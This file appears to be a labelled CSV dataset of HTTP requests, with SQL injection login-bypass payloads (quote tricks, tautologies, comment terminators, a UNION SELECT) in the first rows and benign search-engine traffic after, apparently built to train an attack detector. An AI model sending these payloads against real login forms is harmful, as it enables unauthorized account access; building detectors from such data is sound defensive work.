method,path,body,single_q,double_q,dashes,braces,spaces,url_length,body_length,base64_count,path_entropy,body_entropy,header_count,sql_injection_count,xss_attack_count,command_injection_count,directory_traversal_count,csrf_count,label
POST,/user/login,"username=hii&password="" or """"^""&btn_submit=Login",0,4,0,0,2,11,49,0,3.277613437,4.410229232,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password="" or """"*""&btn_submit=Login",0,4,0,0,2,11,49,0,3.277613437,4.410229232,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=or true--&btn_submit=Login",0,0,1,0,1,11,49,0,3.277613437,4.33860117,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password="" or true--&btn_submit=Login",0,1,1,0,2,11,51,0,3.277613437,4.407144459,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=' or true--&btn_submit=Login",1,0,1,0,2,11,51,0,3.277613437,4.407144459,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password="") or true--&btn_submit=Login",0,1,1,1,2,11,52,0,3.277613437,4.45949116,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=') or true--&btn_submit=Login",1,0,1,1,2,11,52,0,3.277613437,4.45949116,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=' or 'x'='x&btn_submit=Login",4,0,0,0,2,11,51,0,3.277613437,4.41233392,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=') or ('x')=('x&btn_submit=Login",4,0,0,2,2,11,55,0,3.277613437,4.540184032,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=')) or (('x'))=(('x&btn_submit=Login",4,0,0,4,2,11,59,0,3.277613437,4.522225041,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password="" or ""x""=""x&btn_submit=Login",0,4,0,0,2,11,51,0,3.277613437,4.41233392,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password="") or (""x"")=(""x&btn_submit=Login",0,4,0,2,2,11,55,0,3.277613437,4.540184032,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password="")) or ((""x""))=((""x&btn_submit=Login",0,4,0,4,2,11,59,0,3.277613437,4.522225041,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=or 1=1&btn_submit=Login",0,0,0,0,1,11,46,0,3.277613437,4.34389538,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=or 1=1--&btn_submit=Login",0,0,1,0,1,11,48,0,3.277613437,4.412782032,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=or 1=1#&btn_submit=Login",0,0,0,0,1,11,47,0,3.277613437,4.400021564,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=or 1=1/*&btn_submit=Login",0,0,0,0,1,11,48,0,3.277613437,4.454448699,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin' --&btn_submit=Login",1,0,1,0,1,11,49,0,3.277613437,4.392785293,18,1,0,0,0,2,1
POST,/user/login,"username=hii&password=admin' #&btn_submit=Login",1,0,0,0,1,11,48,0,3.277613437,4.379247855,18,1,0,0,0,2,1
POST,/user/login,"username=hii&password=admin'/*&btn_submit=Login",1,0,0,0,0,11,48,0,3.277613437,4.379247855,18,1,0,0,0,2,1
POST,/user/login,"username=hii&password=admin' or '1'='1&btn_submit=Login",4,0,0,0,2,11,56,0,3.277613437,4.403262235,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin' or '1'='1'--&btn_submit=Login",5,0,1,0,2,11,59,0,3.277613437,4.454866253,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin' or '1'='1'#&btn_submit=Login",5,0,0,0,2,11,58,0,3.277613437,4.440070117,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin' or '1'='1'/*&btn_submit=Login",5,0,0,0,2,11,59,0,3.277613437,4.488764559,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin'or 1=1 or ''='&btn_submit=Login",4,0,0,0,3,11,60,0,3.277613437,4.382158205,18,3,0,0,0,2,1
POST,/user/login,"username=hii&password=admin' or 1=1&btn_submit=Login",1,0,0,0,2,11,53,0,3.277613437,4.395294219,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin' or 1=1--&btn_submit=Login",1,0,1,0,2,11,55,0,3.277613437,4.460828977,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin' or 1=1#&btn_submit=Login",1,0,0,0,2,11,54,0,3.277613437,4.44693953,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin' or 1=1/*&btn_submit=Login",1,0,0,0,2,11,55,0,3.277613437,4.497192614,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin') or ('1'='1&btn_submit=Login",4,0,0,1,2,11,58,0,3.277613437,4.502305297,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin') or ('1'='1'--&btn_submit=Login",5,0,1,1,2,11,61,0,3.277613437,4.549772896,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin') or ('1'='1'#&btn_submit=Login",5,0,0,1,2,11,60,0,3.277613437,4.536243413,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin') or ('1'='1'/*&btn_submit=Login",5,0,0,1,2,11,61,0,3.277613437,4.582559781,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin') or '1'='1&btn_submit=Login",4,0,0,1,2,11,57,0,3.277613437,4.453430532,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin') or '1'='1'--&btn_submit=Login",5,0,1,1,2,11,60,0,3.277613437,4.50291008,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin') or '1'='1'#&btn_submit=Login",5,0,0,1,2,11,59,0,3.277613437,4.488764559,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin') or '1'='1'/*&btn_submit=Login",5,0,0,1,2,11,60,0,3.277613437,4.536243413,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055&btn_submit=Login",4,0,0,0,8,11,114,0,3.277613437,5.149665703,18,4,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"" --&btn_submit=Login",0,1,1,0,1,11,49,0,3.277613437,4.392785293,18,1,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"" #&btn_submit=Login",0,1,0,0,1,11,48,0,3.277613437,4.379247855,18,1,0,0,0,2,1
POST,/user/login,"username=hii&password=admin""/*&btn_submit=Login",0,1,0,0,0,11,48,0,3.277613437,4.379247855,18,1,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"" or ""1""=""1&btn_submit=Login",0,4,0,0,2,11,56,0,3.277613437,4.403262235,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"" or ""1""=""1""--&btn_submit=Login",0,5,1,0,2,11,59,0,3.277613437,4.454866253,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"" or ""1""=""1""#&btn_submit=Login",0,5,0,0,2,11,58,0,3.277613437,4.440070117,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"" or ""1""=""1""/*&btn_submit=Login",0,5,0,0,2,11,59,0,3.277613437,4.488764559,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin""or 1=1 or """"=""&btn_submit=Login",0,4,0,0,3,11,60,0,3.277613437,4.382158205,18,3,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"" or 1=1&btn_submit=Login",0,1,0,0,2,11,53,0,3.277613437,4.395294219,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"" or 1=1--&btn_submit=Login",0,1,1,0,2,11,55,0,3.277613437,4.460828977,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"" or 1=1#&btn_submit=Login",0,1,0,0,2,11,54,0,3.277613437,4.44693953,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"" or 1=1/*&btn_submit=Login",0,1,0,0,2,11,55,0,3.277613437,4.497192614,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"") or (""1""=""1&btn_submit=Login",0,4,0,1,2,11,58,0,3.277613437,4.502305297,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"") or (""1""=""1""--&btn_submit=Login",0,5,1,1,2,11,61,0,3.277613437,4.549772896,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"") or (""1""=""1""#&btn_submit=Login",0,5,0,1,2,11,60,0,3.277613437,4.536243413,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"") or (""1""=""1""/*&btn_submit=Login",0,5,0,1,2,11,61,0,3.277613437,4.582559781,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"") or ""1""=""1&btn_submit=Login",0,4,0,1,2,11,57,0,3.277613437,4.453430532,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"") or ""1""=""1""--&btn_submit=Login",0,5,1,1,2,11,60,0,3.277613437,4.50291008,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"") or ""1""=""1""#&btn_submit=Login",0,5,0,1,2,11,59,0,3.277613437,4.488764559,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=admin"") or ""1""=""1""/*&btn_submit=Login",0,5,0,1,2,11,60,0,3.277613437,4.536243413,18,2,0,0,0,2,1
POST,/user/login,"username=hii&password=1' or 1.e(1) or '1'='1&btn_submit=Login",4,0,0,1,4,11,62,0,3.277613437,4.516786383,18,3,0,0,0,2,1
POST,/user/login,"username=hii&password=1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055&btn_submit=Login",0,4,0,0,8,11,114,0,3.277613437,5.149665703,18,4,0,0,0,2,1
GET,/search?q=mars&oq=&gs_lcrp=EgZjaHJvbWUqCQgDEEUYOxjCAzIJCAAQRRg7GMIDMgkIARBFGDsYwgMyCQgCEEUYOxjCAzIJCAMQRRg7GMIDMgkIBBBFGDsYwgMyCQgFEEUYOxjCAzIJCAYQRRg7GMIDMgkIBxBFGDsYwgPSAQw1NjY0NzcwMGowajeoAgiwAgE&sourceid=chrome&ie=UTF-8,0,0,0,0,0,0,223,1,0,5.348020921,0,17,0,0,0,0,0,0
POST,"/gen_204?s=web&t=cap&atyp=csi&ei=nsCCZ_PZDPyavr0Pp_2T0QM&rt=wsrt.4719,hst.25,cbt.39&opi=89978449&dt=&ts=300",0,0,0,0,0,0,107,1,0,5.010863922,0,18,0,0,0,0,0,0
POST,"/gen_204?s=web&t=aft&atyp=csi&ei=nsCCZ_PZDPyavr0Pp_2T0QM&rt=wsrt.4719,hst.25,cbt.39,sct.56,frts.119,frvt.268,prt.456,afti.300,aftip.299,afts.161,aftr.235,aft.300&frtp=330&imn=44&ima=3&imad=3&imac=4&wh=730&aftie=2ahUKEwjzoPj8re6KAxV8ja8BHaf-JDoQ_B16BAgqEAE&aft=1&aftp=730&opi=89978449&dt=&ts=674533",0,0,0,0,0,0,297,1,0,5.279857235,0,18,0,0,0,0,0,0
GET,"/og/_/js/k=og.asy.en_US.xcwvWBp8HRE.2019.O/rt=j/m=_ac,_awd,ada,lldp,qads/exm=/d=1/ed=1/rs=AA2YrTunmYes_cX2mw7iHfeW5vduAnJCNA",0,0,0,0,0,0,124,1,0,5.268713151,0,14,0,0,0,0,0,0
POST,"/gen_204?atyp=csi&ei=nsCCZ_PZDPyavr0Pp_2T0QM&s=web&t=all&frtp=330&imn=44&ima=3&imad=3&imac=4&wh=730&aftie=2ahUKEwjzoPj8re6KAxV8ja8BHaf-JDoQ_B16BAgqEAE&aft=1&aftp=730&adh=tv.6,t.6&cls=0.0007810979184009881&ime=0&imex=0&imeh=5&imeha=4&imehb=1&imea=0&imeb=15&imel=0&imed=0&imeeb=0&scp=0&fld=820&cb=674233&ucb=674233&ts=674533&dt=&mem=ujhs.10,tjhs.12,jhsl.2173,dm.8&nv=ne.1,feid.7edabf77-475c-4c56-bc3e-96aecf98e3d5&net=dl.400,ect.3g,rtt.450,sd.0&hp=&sys=hc.8&p=bs.false&rt=hst.25,cbt.39,sct.56,frts.119,frvt.268,prt.456,afti.300,aftip.299,afts.161,aftr.235,aft.300,xjspls.757,xjsls.757,xjses.1982,xjsee.2113,xjs.2113,lcp.1383,fcp.1083,wsrt.4719,cst.490,dnst.0,rqst.4444,rspt.224,sslt.60,rqstt.499,unt.8,cstt.9&zx=1736622262729&opi=89978449",0,0,0,0,0,0,736,1,0,5.215502681,0,17,0,0,0,0,0,0
GET,/xjs/_/js/md=2/k=xjs.s.en_GB.chMsciMLswo.2018.O/am=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAACAABQEIAAAAAABQAAAAAAAAAAAAABIAAAAAAAACAkCAkAAAAAEAAAAAYAEAABBYAAIDAAQAAAAAAAgAAAAAgQjAfv9xAAAAAAAAAAAAIABEAAAAAADABQBAENRugAAAAACAAAAAABgAAAAIAAAAAAAoAAAAgAAAAAAQAAAAAAAAABAAAAAAAgD0AwAAAAAAAAAAAAAABAAAAAAAwAAFAATwAwAAAAAAAAcAAAAAAQEAAOAYGIAAAAAAAAAA3APA4wHhkMICAAAAAAAAAAAAAAAAApAgmAPpLwhAAAAAAAAAAAAAAAAAAAAAKYImLjcAIA/rs=ACT90oEXOuo_8DKizVteWCMMSpcCHHjG2A,0,0,0,0,0,0,479,1,0,2.997814857,0,15,0,0,0,0,0,0
GET,/client_204?atyp=i&biw=768&bih=730&dpr=1.25&ei=nsCCZ_PZDPyavr0Pp_2T0QM&opi=89978449,0,0,0,0,0,0,83,1,0,5.050781564,0,15,0,0,0,0,0,0
GET,/complete/search?q&cp=0&client=gws-wiz-serp&xssi=t&gs_pcrt=2&hl=en-IN&authuser=0&pq=mars&psi=nsCCZ_PZDPyavr0Pp_2T0QM.1736622262887&dpr=1.25&ofp=GNiNu6SEqYDVfhiGgeLdx97Ot5MBGPjqj9Laqcz7xAEYqPDv0NG_2besARjAmdeo1-yDpe0B&nolsbt=1,0,0,0,0,0,0,225,1,0,5.572689472,0,15,0,0,0,0,0,0
GET,/complete/search?q=mars&cp=0&client=desktop-gws-wiz-on-focus-serp&xssi=t&gs_pcrt=3&hl=en-IN&authuser=0&pq=mars&psi=nsCCZ_PZDPyavr0Pp_2T0QM.1736622262887&dpr=1.25&ofp=EAEY2I27pISpgNV-GIaB4t3H3s63kwEY-OqP0tqpzPvEARio8O_Q0b_Zt6wBGMCZ16jX7IOl7QEyfgoQCg5tYXJzIGNob2NvbGF0ZQoMCgptYXJzIHdhdGVyCgoKCG1hcnMgZ29kCg0KC21hcnMgcGxhbmV0Cg0KC21hcnMgbWFrZXVwChIKEG1hcnMgdGVtcGVyYXR1cmUKDgoMbWFycyBzdXJmYWNlCgwKCm1hcnMgZmFjdHMQRzJVChgKFldoYXQgYXJlIDUgTWFycyBmYWN0cz8KGgoYQ2FuIGh1bWFucyBsaXZlIGF0IE1hcnM_ChoKGERvZXMgTWFycyBoYXZlIDcyIG1vb25zPxDkAg,0,0,0,0,0,0,528,1,0,5.816513083,0,15,0,0,0,0,0,0
GET,"/xjs/_/js/k=xjs.s.en_GB.chMsciMLswo.2018.O/ck=xjs.s.GPMATVE2qFM.L.B1.O/am=AJA6BAgBAAAgAACAEAAqAAgAAAAAAAAAAAAAAAAAAAAAAAAAACABAAAAQgACABIAABAAACAQBQGImQAAAIJXAACwAwAAAAD4ABJxKgANAAACAkCAkAAAAAEAAgABYAMEABBYAAIDQCQAAIAAAA4AAAgAgQjAfv9zYACAAQAAQAAAISBEAAGYBIDGBUBCUP5-gOQHAAWEAEAAABgABEAJeACGAQgqAAZ4gBAAAAAQAAAAAAAAIBBACAAABqD0AwggAEAPAAHgAwCQBBEAICgAwACFACTwAwAIAAAAAEcABAIAAcOIAOAYGIAAAAAAAAAA3APA4wHhkMICAAAAAAAAAAAAAAAAApAgmAPpLwhAAAAAAAAAAAAAAAAAAAAAKYImLjcAIA/d=0/dg=0/br=1/ujg=1/rs=ACT90oE4OjXz86MFdrGwg24vvwKex5FUcA/m=L1AAkb,hezEbd,G6wU6e,sy18l,sy14b,sy14d,syu2,sy18o,sy14g,sy148,sy149,sytt,sy14c,sytu,syg2,syfu,syft,syg0,sytx,sytw,sy18n,Wn3aEc,sy87d,sy6zh,sy3um,sy388,sy2sk,syz7,Um3BXb,sy78d,nPaQu,sy3lw,sy3lp,sy3lq,sy30d,sy1he,sy167,sy3lv,sy3ma,sy3m9,sy3lm,sy3m7,KHourd,sy7ry,pHXghd?xjs=s3",0,0,0,0,0,0,798,1,0,4.870565621,0,15,0,0,0,0,0,0
GET,"/xjs/_/js/k=xjs.s.en_GB.chMsciMLswo.2018.O/ck=xjs.s.GPMATVE2qFM.L.B1.O/am=AJA6BAgBAAAgAACAEAAqAAgAAAAAAAAAAAAAAAAAAAAAAAAAACABAAAAQgACABIAABAAACAQBQGImQAAAIJXAACwAwAAAAD4ABJxKgANAAACAkCAkAAAAAEAAgABYAMEABBYAAIDQCQAAIAAAA4AAAgAgQjAfv9zYACAAQAAQAAAISBEAAGYBIDGBUBCUP5-gOQHAAWEAEAAABgABEAJeACGAQgqAAZ4gBAAAAAQAAAAAAAAIBBACAAABqD0AwggAEAPAAHgAwCQBBEAICgAwACFACTwAwAIAAAAAEcABAIAAcOIAOAYGIAAAAAAAAAA3APA4wHhkMICAAAAAAAAAAAAAAAAApAgmAPpLwhAAAAAAAAAAAAAAAAAAAAAKYImLjcAIA/d=0/dg=0/br=1/ujg=1/rs=ACT90oE4OjXz86MFdrGwg24vvwKex5FUcA/m=sy2pr,syta,tIj4fb,sy412,sy1kh,sy1kg,w4UyN,sy44v,sy44u,sy44t,sy44s,SJpD2c,sy63m,sy5xl,sy18f,sy18e,sy18b,sy18g,sy17c,sy18d,sy13c,sy136,sy12z,sy131,syas,syba,sy58w,sy2fh,sy2fb,sy298,syd9,syd7,sybi,sybg,syb2,sybf,syb5,syb4,sybc,syb9,syb3,syah,sya5,sy1m4,syyc,syug,syfx,bEGPrc,sy1mz,sy63o,sy63n,mBG1hd,sy63p,mscaJf,sy63t,sGwFce,HxbScf,kQvlef,eAR4Hf,sy63u,h3zgVb,lRePd,sy44m,nN2e1e,sy63q,sy63v,sy21v,IRJCef,sy63s,sy63r,scFHte,pr5okc,IFqxxc,sy44n,OXpAmf,sy63w,sy414,sy40x,sy40w,sy1m6,sy1m7,sy19m,sy19k,sy19l,sy19h,sy19i,sy19f,sy19e,sy199,sy19g,syzk,syzl,syzj,syzm,syzi,syzn,syza,syz9,syzb,syzo,syzp,GElbSc,sytf,sytc,sytb,syt9,DPreE,sy649,xdV1C,sy6bs,HYSCof,U9EYge,sy6uy,sy3jz,sy279,sy1jw,sysz,sysy,syt0,sys5,sys6,sys4,sys7,sys3,sysd,sysa,sys9,sys8,syrv,sysx,sysm,sysf,sysb,sys0,syrx,syrr,syrz,KSk4yc,sy7ma,sy2zc,SC7lYd,sy3ja,msmzHf,sy6b5,cSX9Xe,syw6,syw5,rtH1bd,syuv,syur,syuq,syuu,syut,syus,syum,syud,SMquOb,EiD4Fe,sywf,sywd,sywc,syw9,syti,sywb,d5EhJe,sy1mw,fCxEDd,syye,sy1mu,sy1mt,sy1ms,sy1mq,sy1mp,sy1mo,sy1mk,sy1dp,sy1dr,sy1dq,sy1do,sywn,syup,sywk,sywp,T1HOxc,sywl,sywj,zx30Y,sy1my,sy1mx,sy1mh,Wo3n8,sy18q,M0hWhd,sy14a,sy8bq,sy8bs,sy6zl,sy18m,ABJeBb,sy15v?xjs=s3",0,0,0,0,0,0,1684,1,0,4.961439333,0,15,0,0,0,0,0,0
GET,/s/i/productlogos/googleg/v6/24px.svg,0,0,0,0,0,0,37,1,0,3.872049488,0,14,0,0,0,0,0,0
GET,"/xjs/_/js/k=xjs.s.en_GB.chMsciMLswo.2018.O/ck=xjs.s.GPMATVE2qFM.L.B1.O/am=AJA6BAgBAAAgAACAEAAqAAgAAAAAAAAAAAAAAAAAAAAAAAAAACABAAAAQgACABIAABAAACAQBQGImQAAAIJXAACwAwAAAAD4ABJxKgANAAACAkCAkAAAAAEAAgABYAMEABBYAAIDQCQAAIAAAA4AAAgAgQjAfv9zYACAAQAAQAAAISBEAAGYBIDGBUBCUP5-gOQHAAWEAEAAABgABEAJeACGAQgqAAZ4gBAAAAAQAAAAAAAAIBBACAAABqD0AwggAEAPAAHgAwCQBBEAICgAwACFACTwAwAIAAAAAEcABAIAAcOIAOAYGIAAAAAAAAAA3APA4wHhkMICAAAAAAAAAAAAAAAAApAgmAPpLwhAAAAAAAAAAAAAAAAAAAAAKYImLjcAIA/d=0/dg=0/br=1/ujg=1/rs=ACT90oE4OjXz86MFdrGwg24vvwKex5FUcA/m=UMk45c,bplExb,nMfLA,O19q8,xMHx5e,R6UkWb,tW711b,UX8qee,tDA9G,sy3hh,sy3he,sy3hd,sy3hc,syyi,syyh,sy16n,syyv,syyg,syyu,syyj,sysj,sysh,syyk,sy2yz,sy2z0,sy2z1,sy16j,sy1a6,sy1a7,sy16k,sy43v,sy43u,sy3ha,sy16h,sy160,sy12s,sy12r,sy12t,sy12p,sy12n,sy2z2,sy16q,sy16p,sy16d,sy16r,sy16b,sy16a,sy16c,sy15z,syrw,Eox39d,sy89,sy88,syid,syi9,syia,syi8,syim,syik,syij,syii,syie,syi7,syc3,syby,sye4,sye5,syco,sycj,sycc,sycf,syce,sycb,syc1,syc9,sych,sycm,syck,syc6,sybw,syc4,syc2,sycn,syc0,sybq,sybn,syb0,syav,sybl,syaf,syeh,syb7,syb1,syb6,sye7,sye1,sydp,sydt,sydd,syde,sydk,sydj,sydb,syae,syad,sydc,syd3,syd2,sydi,sydf,syd1,syd0,sycz,sycw,sycx,sycy,syct,sycr,sycs,sycu,sybp,sybt,sydg,syhx,syi6,syi2,syi3,sy8x,sy8t,sy8w,syhz,syg3,syi4,syhy,syhw,syht,syhs,syhr,syhq,sy90,uxMpU,syhi,syek,sydm,syee,syeg,sye8,syei,syeb,sybs,sycv,syec,sye2,sy9h,sy9g,sy9f,sy9e,Mlhmy,QGR0gd,OTA3Ae,sy8a,EEDORb,PoEs9b,Pjplud,sy9b,sy97,sy95,A1yn5d,YIZmRd,uY49fb,sy7y,sy7t,sy7x,sy7w,sy7u,byfTOb,lsjVmc,LEikZe,kWgXee,ovKuLd,sgY6Zb,sy9r,sy9p,sy8z,xUdipf,NwH0H,gychg,ZfAoz,yDVVkb,qafBPd,ebZ3mb,dowIGb,sy6c4,sy41x,DpX64d,uKlGbf,sy6c5,EufiNb,sy67c,sy2sb?xjs=s3",0,0,0,0,0,0,1633,1,0,4.925604474,0,14,0,0,0,0,0,0
POST,/gen_204?atyp=i&ei=nsCCZ_PZDPyavr0Pp_2T0QM&vet=12ahUKEwjzoPj8re6KAxV8ja8BHaf-JDoQuqMJegQIFRAA..s&bl=PmNg&s=web&lpl=CAUYATAPOANiCAgHEMC77_8B&zx=1736622263396&opi=89978449,0,0,0,0,0,0,169,1,0,5.641627996,0,17,0,0,0,0,0,0
GET,/gen_204?atyp=i&ct=psnt&cad=&nt=navigate&ei=nsCCZ_PZDPyavr0Pp_2T0QM&zx=1736622263390&opi=89978449,0,0,0,0,0,0,97,1,0,4.9490969,0,15,0,0,0,0,0,0
GET,"/xjs/_/js/k=xjs.s.en_GB.chMsciMLswo.2018.O/am=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAACAABQEIAAAAAABQAAAAAAAAAAAAABIAAAAAAAACAkCAkAAAAAEAAAAAYAEAABBYAAIDAAQAAAAAAAgAAAAAgQjAfv9xAAAAAAAAAAAAIABEAAAAAADABQBAENRugAAAAACAAAAAABgAAAAIAAAAAAAoAAAAgAAAAAAQAAAAAAAAABAAAAAAAgD0AwAAAAAAAAAAAAAABAAAAAAAwAAFAATwAwAAAAAAAAcAAAAAAQEAAOAYGIAAAAAAAAAA3APA4wHhkMICAAAAAAAAAAAAAAAAApAgmAPpLwhAAAAAAAAAAAAAAAAAAAAAKYImLjcAIA/d=0/dg=0/br=1/rs=ACT90oEXOuo_8DKizVteWCMMSpcCHHjG2A/m=sy6wa,u9YDDf,sy13k,bwixAb,sy13o,sy13n,sy13m,s0j7C,sy13q,sy13p,QQ51Ce?xjs=s4",0,0,0,0,0,0,566,1,0,3.620025245,0,15,0,0,0,0,0,0
GET,"/xjs/_/js/k=xjs.s.en_GB.chMsciMLswo.2018.O/am=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAACAABQEIAAAAAABQAAAAAAAAAAAAABIAAAAAAAACAkCAkAAAAAEAAAAAYAEAABBYAAIDAAQAAAAAAAgAAAAAgQjAfv9xAAAAAAAAAAAAIABEAAAAAADABQBAENRugAAAAACAAAAAABgAAAAIAAAAAAAoAAAAgAAAAAAQAAAAAAAAABAAAAAAAgD0AwAAAAAAAAAAAAAABAAAAAAAwAAFAATwAwAAAAAAAAcAAAAAAQEAAOAYGIAAAAAAAAAA3APA4wHhkMICAAAAAAAAAAAAAAAAApAgmAPpLwhAAAAAAAAAAAAAAAAAAAAAKYImLjcAIA/d=0/dg=0/br=1/rs=ACT90oEXOuo_8DKizVteWCMMSpcCHHjG2A/m=sb_wiz,aa,abd,sy2ud,syxs,syxr,syxj,syxq,syxt,async,sy13r,bgd,sy802,foot,sy21t,kyn,sy1vs,sy2qb,lli,sf,syxf,syxg,sy4s6,sonic,sy1l4,sygz,sy2su,sy16i,sy27i,sy27j,spch,tl,sy3jn,sy3jl,syxm,syxo,sy3jm,syz1,EkevXb,sy1pj,fiAufb,sy1ns,SZXsif,sy7ox,sy80i,sy6ck,sy3pa,syw3,sYEX8b,sy26w,NEW1Qc,xBbsrc,sy26y,IX53Tb,ma4xG,syty,sy1ac,syto,E9M6Uc,sytz,NO84gd,b5lhvb,IoGlCf,syth,sytg,C8HsP,syu4,sytr,gOTY1,syvc,syv8,syva,syv9,syux,syv0,syvd,syv7,syv5,syv4,syv2,syub,syua,syuc,syu9,syv6,PbHo4e,RagDlc,oUlnpc,sy87k,sy87l,sy71x,sy3ue,sy2ov,sy2ow,sy2or,sy14z,syvr,syvw,Da4hkd,sy18r,A7ULAd,sy18u,sy18t,sy18s,cNgdQc,sy1av,sy1au,sy1as,sy1ar,sy1aq,sytq,sytp,syts,sytk,sytl,sytj,sytm,LdB9sd,syvi,UBXHI,syvj,R3fhkb,syhp,aLUfP,syz0,TSZEqd,sy71z,ND0kmf,sy5n6,sy19d,zGLm3b,sy1ny,EbPKJf,sy1n8,sy1n6,syjv,sy1lt,CnSW2d,sy1o3,sy1o2,sy1o0,sy1n9,pFsdhd,sy1kc,sy1kd,Qj0suc,JXS8fb,sy1ka,NdLnDf,sy1k2,QKZgZd,zD2Asd,sy1kw,sy1k9,sy1kt,sy1k8,sy1ku,sy1kr,sy1ks,sy1kn,sy1km,sy1ko,sy1ki,sy1kq,sy1kk,sy1kl,sy1kf,sy1k5,Wct42,sy1lc,sy1iq,syqu,syqt,syqv,sy1j5,sy1j4,sy1j3,syoz,syoy,syoa,sy1j2,sy1j0,sy1iz,sy1iy,sy1iw,sy1iv,sy1iu,sy1it,sy1is,sy1ir,LiBxPe,sy3h0,syx0,GCSbhd,sy45s,T5VV,sy2z9,aDVF7,sy6qr,rhYw1b?xjs=s4",0,0,0,0,0,0,1655,1,0,4.791634763,0,15,0,0,0,0,0,0
